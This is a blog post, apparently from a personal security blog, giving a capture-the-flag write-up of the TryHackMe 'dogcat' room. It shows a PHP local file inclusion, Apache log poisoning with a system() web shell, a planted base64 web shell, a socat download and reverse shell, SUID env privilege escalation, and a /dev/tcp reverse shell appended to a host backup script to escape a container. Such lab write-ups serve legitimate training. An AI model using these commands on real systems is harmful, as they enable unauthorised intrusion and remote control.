@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  <meta name="author" content="Piotr Politowicz">
+
+
+
+
+
+<title>THM dogcat writeup | Pwicz Blog</title>
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
+
+
+
+<script src="/lib/jquery.min.js"></script>
+
+
+<script src="/lib/iconify-icon.min.js"></script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: "class",
+  };
+</script>
+
+
+<script src="/lib/nprogress/nprogress.js"></script>
+
+<script>
+  $(document).ready(() => {
+    NProgress.configure({
+      showSpinner: false,
+    });
+    NProgress.start();
+    $("#nprogress .bar").css({
+      background: "#FF4C29",
+    });
+    $("#nprogress .peg").css({
+      "box-shadow": "0 0 2px #FF4C29, 0 0 4px #FF4C29",
+    });
+    $("#nprogress .spinner-icon").css({
+      "border-top-color": "#FF4C29",
+      "border-left-color": "#FF4C29",
+    });
+    setTimeout(function () {
+      NProgress.done();
+      $(".fade").removeClass("out");
+    }, 800);
+  });
+</script>
+
+<script>
+  (function () {
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+    if (setting === "dark" || (prefersDark && setting !== "light"))
+      document.documentElement.classList.toggle("dark", true);
+    let isDark = document.documentElement.classList.contains("dark");
+  })();
+
+  $(document).ready(function () {
+    // init icon
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const isDark = document.documentElement.classList.contains("dark");
+    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+
+    function toggleGiscusTheme() {
+      const isDark = document.documentElement.classList.contains("dark");
+      const giscusFrame = document.querySelector("iframe.giscus-frame");
+      if (giscusFrame) {
+        giscusFrame.contentWindow.postMessage(
+          {
+            giscus: {
+              setConfig: {
+                theme: isDark ? "dark" : "light",
+              },
+            },
+          },
+          "https://giscus.app"
+        );
+      }
+    }
+
+
+    // toggle dark mode
+    function toggleDark() {
+      let isDark = document.documentElement.classList.contains("dark");
+      isDark = !isDark;
+      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+      document.documentElement.classList.toggle("dark", isDark);
+      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+      if (prefersDark === isDark) {
+        localStorage.setItem("hexo-color-scheme", "auto");
+      } else {
+        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
+      }
+      toggleGiscusTheme();
+    }
+    $("#toggle-dark").click(toggleDark);
+    // listen dark mode change
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (e) => {
+        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+        if (setting === "auto") {
+          document.documentElement.classList.toggle("dark", e.matches);
+          $("#theme-icon").attr(
+            "icon",
+            e.matches ? "ri:moon-line" : "ri:sun-line"
+          );
+          toggleGiscusTheme();
+        }
+      });
+  });
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200">
+  <header
+  class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5"
+>
+  <div class="max-auto">
+    <nav class="flex items-center text-base">
+      <a href="/" class="group">
+        <h2 class="font-medium tracking-tighterp text-l p-2">
+          <img
+            class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]"
+            style="filter: invert(49%) sepia(99%) saturate(2270%) hue-rotate(334deg) brightness(91%) contrast(126%);"
+            id="logo"
+            src="/images/fox.svg"
+            alt="Pwicz Blog"
+          />
+          Pwicz Blog
+        </h2>
+      </a>
+      <div
+        id="header-title"
+        class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis"
+      >
+        THM dogcat writeup
+      </div>
+      <div class="flex-1"></div>
+      <div class="flex items-center gap-3">
+        
+        <a class="hidden sm:flex" href="/archives"
+          >Posts</a
+        >
+        
+        <a class="hidden sm:flex" href="/category"
+          >Categories</a
+        >
+        
+        <a class="hidden sm:flex" href="/tag"
+          >Tags</a
+        >
+          
+        <a
+          class="w-5 h-5 hidden sm:flex"
+          title="Github"
+          target="_blank" rel="noopener" href="https://github.com/pwicz"
+        >
+          <iconify-icon
+            width="20"
+            icon="ri:github-line"
+          ></iconify-icon>
+        </a>
+        
+        <a
+          class="w-5 h-5 hidden sm:flex"
+          title="Twitter"
+          target="_blank" rel="noopener" href="https://twitter.com/pwicz1"
+        >
+          <iconify-icon
+            width="20"
+            icon="ri:twitter-line"
+          ></iconify-icon>
+        </a>
+         
+        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
+          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
+        </a>
+      </div>
+      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
+        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
+          <iconify-icon width="20" icon="carbon:menu"></iconify-icon>
+        </span>
+        <span
+          class="w-5 h-5 hidden"
+          aria-hidden="true"
+          role="img"
+          id="close-menu"
+        >
+          <iconify-icon width="20" icon="carbon:close"></iconify-icon>
+        </span>
+      </div>
+    </nav>
+  </div>
+</header>
+<div
+  id="menu-panel"
+  class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10"
+>
+  <div
+    id="menu-content"
+    class="relative z-20 bg-white/80 dark:bg-black/5 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300"
+  >
+    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
+      
+      <li
+        class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main"
+      >
+        <a
+          href="/archives"
+          class="flex h-12 sm:h-auto items-center"
+          >Posts</a
+        >
+      </li>
+      
+      <li
+        class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main"
+      >
+        <a
+          href="/category"
+          class="flex h-12 sm:h-auto items-center"
+          >Categories</a
+        >
+      </li>
+      
+      <li
+        class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main"
+      >
+        <a
+          href="/tag"
+          class="flex h-12 sm:h-auto items-center"
+          >Tags</a
+        >
+      </li>
+      
+    </ul>
+  </div>
+  <div class="mask bg-black/20 absolute inset-0"></div>
+</div>
+
+  <main class="p-12">
+    <!-- css -->
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
+ 
+<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
+
+<!-- toc -->
+ <!-- tocbot -->
+<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
+ 
+<section class="px-6 max-w-prose mx-auto md:px-0">
+  <!-- header -->
+  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
+    <div class="pt-4 md:pt-6">
+      <h1
+        id="article-title"
+        class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]"
+      >
+        THM dogcat writeup
+      </h1>
+      <p class="mb-6"></p>
+      <div>
+        <section class="flex items-center gap-3 text-sm">
+          <time>2023-11-29 20:46:48</time>
+          <span class="text-gray-400">·</span>
+          <span>8 min</span>
+          <span class="text-gray-400">·</span>
+          <span>1.4k words</span>
+        </section>
+      </div>
+    </div>
+  </header>
+  <!-- content -->
+  <article class="post-content mt-10 prose dark:prose-invert post-content">
+    <p>Challenge link: <a target="_blank" rel="noopener" href="https://tryhackme.com/room/dogcat">https://tryhackme.com/room/dogcat</a></p>
+<h2 id="1-Reconnaissance"><a href="#1-Reconnaissance" class="headerlink" title="1. Reconnaissance"></a>1. Reconnaissance</h2><p>First things first, we perform a port scan on the target to discover potential attack vectors:<br><img src="https://i.imgur.com/7G04ln2.png"></p>
+<p>We do not see anything special besides the HTTP server on port 80 and an SSH service on port 22. We will likely have to find a web vulnerability and using it connect to the server through SSH for privilege escalation.</p>
+<h2 id="2-Vulnerable-website"><a href="#2-Vulnerable-website" class="headerlink" title="2. Vulnerable website"></a>2. Vulnerable website</h2><p>The website allows us to see random pictures of dogs and cats. For example, asking to see a dog, we get the following result:<br><img src="https://i.imgur.com/HBLbopi.png"><br>A nice dog for sure, but the URL parameter called <code>view</code> is of particular interest to us. What if we want to see a fox?<br><img src="https://i.imgur.com/4LxdpRV.png"><br>Only dogs or cats allowed. All right, what about a dogfish?<br><img src="https://i.imgur.com/Ro9CgxZ.png"><br>Cool, this is enough to confirm that there exists a file inclusion vulnerability, most likely a local file inclusion (LFI), and that some sort of a filter is used that requires a ‘dog’ to be in the view parameter.</p>
+<h3 id="Exploiting-the-LFI-vulnerability"><a href="#Exploiting-the-LFI-vulnerability" class="headerlink" title="Exploiting the LFI vulnerability"></a>Exploiting the LFI vulnerability</h3><p>From the two warnings displayed, we can conclude that PHP tries to include a file named after the view parameter with the <code>.php</code> extension appended to it. In this case, <code>dogfish.php</code>. We can also see that this operations is being performed from the <code>index.php</code> file. What we can do now is try to read the content of that file by using a php filter that converts its content into a <code>base64</code> encoding.<br>Setting the view parameter to:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=dog/../index</span></span><br></pre></td></tr></table></figure>
+<p>allows us to base64 encode the resource pointed by the path <code>dog/../index.php</code>. We can’t simply point to <code>index.php</code> as we also need to bypass the filter. This is the result:<br><img src="https://i.imgur.com/1t5fhqr.png"></p>
+<p>As expected, the content of the index.php file is returned with the following script inside:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">containsStr</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$substr</span></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="variable">$substr</span>) !== <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ext&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;ext&quot;</span>] : <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>])) &#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="title function_ invoke__">containsStr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>], <span class="string">&#x27;dog&#x27;</span>) || <span class="title function_ invoke__">containsStr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>], <span class="string">&#x27;cat&#x27;</span>)) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&#x27;Here you go!&#x27;</span>;</span><br><span class="line">               <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>] . <span class="variable">$ext</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&#x27;Sorry, only dogs or cats are allowed.&#x27;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>This helps us to further exploit the vulnerability. We can see that by setting another parameter called <code>ext</code>, we can include any file we want. Let us try to read the <code>/etc/passwd</code> file with the following url:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//&lt;IP&gt;/?view=php://filter/convert.base64-encode/resource=dog/../../../../../../etc/passwd&amp;ext=</span></span><br></pre></td></tr></table></figure>
+<p>It works! However, <code>/etc/shadow</code> is not readable, so trying to crack the password of one of the users is not an option. </p>
+<h3 id="Obtaining-code-execution"><a href="#Obtaining-code-execution" class="headerlink" title="Obtaining code execution"></a>Obtaining code execution</h3><p>Since we know that the website is run by the Apache server, we can try to read its access log that logs all requests sent to the server, and potentially perform a log injection attack. I googled typical locations of the access log and tried to read a file from <code>/var/log/apache/access.log</code>. It returned an error, so I tried reading from <code>/var/log/apache2/access.log</code> instead. This was a success! The returned file was not small, so let’s focus on one of its entries:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;IP&gt; - - [<span class="number">29</span>/Nov/<span class="number">2023</span>:<span class="number">07</span>:<span class="number">20</span>:<span class="number">46</span> +<span class="number">0000</span>] <span class="string">&quot;GET /?view=php://filter/convert.base64-encode/resource=dog/../index.php HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">719</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>It includes the <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent">User-Agent request header</a> which is controlled by us. Since the log can be included in the <code>index.php</code> file, any php code that we manage to insert into this file will be executed. The idea is to specify a User-Agent header that will allow us to execute arbitrary code when including the file. </p>
+<p>Using Burp Suite, we intercept one of the requests, send it to the repeater, and set its User-Agent header to:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/kM9eKga.png"></p>
+<p>Sending one such a request makes it visible in the access log file. Let us now try to read the <code>/etc/passwd</code> file from the included access log by sending a following request:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//&lt;IP&gt;/?view=dog/../../../../../../var/log/apache2/access&amp;ext=.log&amp;command=cat%20/etc/passwd</span></span><br></pre></td></tr></table></figure>
+<p>At the bottom of the included file, right in the place of the malicious user agent, the following output is visible that confirms that the code execution works:<br><img src="https://i.imgur.com/hWyQHAy.png"></p>
+<h3 id="To-the-reverse-shell"><a href="#To-the-reverse-shell" class="headerlink" title="To the reverse shell!"></a>To the reverse shell!</h3><p>I tried to connect back to my machine using the command parameter, but for some reason it did not work. I decided to echo a base64 string to a new php file, decode it, and execute commands from there. We can echo the base64 string using the following parameter:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;command=<span class="keyword">echo</span> PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU%<span class="number">2</span>BIjsgZGllOyB9Pz4%<span class="number">3</span>D &gt; test.php</span><br></pre></td></tr></table></figure>
+<p>Then, decode it using:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;command=cat test.php | base64 -d &gt; c.php</span><br></pre></td></tr></table></figure>
+<p>We can now execute commands by calling:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:/&lt;IP&gt;/c.php?cmd=whoami</span><br></pre></td></tr></table></figure>
+<p>Trying out different shells from the very useful <a target="_blank" rel="noopener" href="https://www.revshells.com/">revshells.com</a> website, the <code>PHP proc_open</code> with the <code>sh</code> shell connected back to me.<br><img src="https://i.imgur.com/ndrJuOH.png"></p>
+<h2 id="3-Privilege-escalation"><a href="#3-Privilege-escalation" class="headerlink" title="3. Privilege escalation"></a>3. Privilege escalation</h2><p>As shown above with the ls command, the first flag is accessible from the <code>flag.php</code> file located in the same directory as index.php. </p>
+<h3 id="Shell-upgrade"><a href="#Shell-upgrade" class="headerlink" title="Shell upgrade"></a>Shell upgrade</h3><p>To get access to a more convenient shell, I uploaded the <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">socat binary</a> to the victim machine using a Python server.<br>On the attacker machine (assuming the socat binary is located in the same directory):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 6868</span><br></pre></td></tr></table></figure>
+<p>Together with a socat listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:8282 FILE:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0</span><br></pre></td></tr></table></figure>
+
+<p>On the victim machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 10.4.46.75:6868/socat &gt; socat</span><br><span class="line"><span class="built_in">chmod</span> +x socat</span><br><span class="line">./socat TCP:&lt;IP&gt;:8282 EXEC:<span class="string">&quot;bash -li&quot;</span>,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure>
+
+<p>And voila! The upgraded shell is ready:<br><img src="https://i.imgur.com/T9u32Pe.png"></p>
+<h3 id="SUID-binary"><a href="#SUID-binary" class="headerlink" title="SUID binary"></a>SUID binary</h3><p>Next, while looking for a potential attack vector, I found a SUID binary that could be used to spawn a root shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure>
+<p>Result:<br><img src="https://i.imgur.com/yEN0LvK.png"></p>
+<p>Confirming with <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/env/">GTFObins</a>, env is vulnerable and can be exploited using:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> /bin/sh -p</span><br></pre></td></tr></table></figure>
+<p>Running this command gives us a root shell which can be used to access flag3 located in the root user home directory:<br><img src="https://i.imgur.com/CdZdUer.png"></p>
+<h2 id="4-Finding-other-flags"><a href="#4-Finding-other-flags" class="headerlink" title="4. Finding other flags"></a>4. Finding other flags</h2><p>I found the flag2 by simply searching for it with the <code>find</code> tool:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name *flag* 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>It is located in the &#x2F;var&#x2F;www directory.</p>
+<h3 id="One-more-layer"><a href="#One-more-layer" class="headerlink" title="One more layer?"></a>One more layer?</h3><p>The last flag was not that easy to find. At some point I came across the <code>/opt/backups</code> directory containing a <code>backup.tar</code> archive with files identical to the ones located on the machine and a <code>backup.sh</code> script. The content of the script is the following:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">tar cf /root/container/backup/backup.tar /root/container</span><br></pre></td></tr></table></figure>
+<p>It creates the backup using files from some container directory. This directory is not present in our <code>/root</code> directory. This could indicate that we obtained the root access to a container and not the host machine. Moreover, a <code>.dockerenv</code> file is present in the root directory which points to the same conclusion.</p>
+<p>Going back to the <code>backup.sh</code> script. Since it creates a backup of files, it could be that it is run periodically by the host. Being able to write to the file, we can try to inject our own code that will spawn a shell and give us access to the host:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/backups</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sh -i &gt;&amp; /dev/tcp/&lt;IP&gt;/8199 0&gt;&amp;1&quot;</span> &gt;&gt; backup.sh</span><br></pre></td></tr></table></figure>
+<p>After creating a listener on the attacker machine and waiting for a moment, a successful connection was created that revelead the last flag:<br><img src="https://i.imgur.com/PgRmAvb.png"></p>
+<h2 id="5-Lessons-learned"><a href="#5-Lessons-learned" class="headerlink" title="5. Lessons learned"></a>5. Lessons learned</h2><p>The LFI vulnerabilities can be prevented by not trusting user input when deciding on what files should be included. Otherwise, we could check if a file to be included is located in the allowed directory or if it is allowed by the server. </p>
+<p>Furthermore, a proper configuration of the server would prevent setting the SUID permission on a binary that can be used to spawn a privileged shell. Regular penetration tests or simpler tests using automated tools are also advised to ensure high difficulty of privilege escalation. Lastly, any scripts run with root permissions or by container hosts should not be writable by less privileged users.</p>
+
+  </article>
+  <!-- tag -->
+  
+  <div class="mt-12 pt-6 border-t border-gray-200">
+    
+    <span
+      class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200"
+    >
+      <a href="/tags/THM/">THM</a>
+    </span>
+    
+    <span
+      class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200"
+    >
+      <a href="/tags/writeup/">writeup</a>
+    </span>
+    
+    <span
+      class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200"
+    >
+      <a href="/tags/challenge/">challenge</a>
+    </span>
+    
+  </div>
+  
+  <!-- prev and next -->
+  <div class="flex justify-between mt-6 pt-6 border-t border-gray-200">
+    <div>
+      
+    </div>
+    <div>
+      
+      <a
+        href="/2023/09/11/Weak-RSA/"
+        class="text-sm text-gray-400 hover:text-gray-500 flex justify-center"
+      >
+        Weak RSA
+        <iconify-icon
+          width="20"
+          icon="ri:arrow-right-s-line"
+          data-inline="false"
+        ></iconify-icon>
+      </a>
+      
+    </div>
+  </div>
+  <!-- comment -->
+  <div class="article-comments mt-12">
+</div>
+</section>
+<!-- js inspect -->
+
+<script src="/lib/clipboard.min.js"></script>
+ 
+<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+ 
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(() => {
+    const maraidConfig = {
+      theme: "dark",
+      logLevel: 3,
+      flowchart: { curve: "linear" },
+      gantt: { axisFormat: "%m/%d/%Y" },
+      sequence: { actorMargin: 50 },
+    };
+    mermaid.initialize(maraidConfig);
+  });
+</script>
+
+ 
+<script src="/lib/fancybox/fancybox.umd.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+    $('.post-content').each(function(i){
+      $(this).find('img').each(function(){
+        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
+        var alt = this.alt;
+        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
+        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
+      });
+      $(this).find('.fancybox').each(function(){
+        $(this).attr('rel', 'article' + i);
+      });
+    });
+
+    Fancybox.bind('[data-fancybox="gallery"]', {
+        // options
+    })
+  })
+</script>
+ <!-- tocbot begin -->
+
+<script src="/lib/tocbot/tocbot.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+      tocbot.init({
+        // Where to render the table of contents.
+        tocSelector: '.post-toc',
+        // Where to grab the headings to build the table of contents.
+        contentSelector: '.post-content',
+        // Which headings to grab inside of the contentSelector element.
+        headingSelector: 'h1, h2, h3',
+        // For headings inside relative or absolute positioned containers within content.
+        hasInnerContainers: true,
+    });
+  })
+</script>
+<!-- tocbot end -->
+
+
+  </main>
+  <footer
+  class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm"
+>
+  <!-- busuanzi -->
+  <!-- 
+ -->
+  <!-- copyright -->
+  <div class="flex items-center gap-2">
+    <span>© 2023 </span>
+    <a href="https://github.com/pwicz" target="_blank" rel="noopener noreferrer"
+      >pwicz</a
+    >
+  </div>
+  <!-- powered by -->
+  <div class="flex items-center gap-2">
+    <span>Powered by</span>
+    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer"
+      >Hexo</a
+    >
+    <span>&</span>
+    <a
+      href="https://github.com/xbmlz/hexo-theme-maple"
+      target="_blank"
+      rel="noopener noreferrer"
+      >Maple</a
+    >
+  </div>
+</footer>
+
+  <iconify-icon class="fixed right-4 bottom-10 z-100 opacity-0" width="24" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
+  
+<script src="/js/main.js"></script>
+ 
+
+
+  <div class="w-screen h-screen -z-999" id="maple"></div>
+</body>
+
+</html>
